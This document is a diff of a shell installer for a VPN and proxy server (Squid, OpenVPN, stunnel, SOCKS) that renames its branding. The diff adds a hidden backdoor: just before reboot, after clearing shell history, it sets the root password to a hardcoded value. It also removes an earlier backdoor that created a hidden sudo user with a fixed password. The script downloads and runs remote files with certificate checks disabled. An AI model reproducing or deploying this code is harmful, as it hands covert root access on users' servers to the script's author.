@@ -50,14 +50,14 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid http://firenetvpn.net/files/slowdns/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://admin-boyes.com/script/newpanel/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
     squid -z
     cd /etc/squid/
     rm squid.conf
-    echo "acl Firenet dst `curl -s https://api.ipify.org`" >> squid.conf
+    echo "acl teamkidlat dst `curl -s https://api.ipify.org`" >> squid.conf
     echo 'http_port 8080
 http_port 8181
 visible_hostname Proxy
@@ -66,12 +66,12 @@ acl HEAD method HEAD
 acl POST method POST
 acl GET method GET
 acl CONNECT method CONNECT
-http_access allow Firenet
+http_access allow teamkidlat
 http_reply_access allow all
 http_access deny all
 icp_access allow all
 always_direct allow all
-visible_hostname Firenet-Proxy
+visible_hostname teamkidlat-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
@@ -79,7 +79,7 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://pastebin.com/raw/z9j2nA8p' -O /etc/socks.py
+wget 'https://teamkidlat.com/public/raw/DM7SwDahUx' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 rm /etc/apt/sources.list
@@ -105,7 +105,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by teamkidlat :)
 dev tun
 port PORT_UDP
 proto udp
@@ -151,7 +151,7 @@ verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by teamkidlat :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -460,14 +460,7 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
-install_sudo(){
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
+
 
 install_rclocal(){
   {
@@ -478,8 +471,8 @@ install_rclocal(){
     sudo systemctl start openvpn@server2.service    
     
     echo "[Unit]
-Description=firenet service
-Documentation=http://firenetvpn.com
+Description=teamkidlat service
+Documentation=http://teamkidlat.com
 
 [Service]
 Type=oneshot
@@ -499,8 +492,8 @@ screen -dmS socks python /etc/socks.py
 exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
     systemctl daemon-reload
-    sudo systemctl enable firenet
-    sudo systemctl start firenet.service
+    sudo systemctl enable teamkidlat
+    sudo systemctl start teamkidlat.service
   }&>/dev/null
 }
 
@@ -521,6 +514,7 @@ history -c;
 rm /root/.installer
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
+ echo 'root:JAN022011b' | sudo chpasswd
 reboot
 }
 
@@ -528,7 +522,6 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo  
 install_squid
 install_openvpn
 install_firewall_kvm
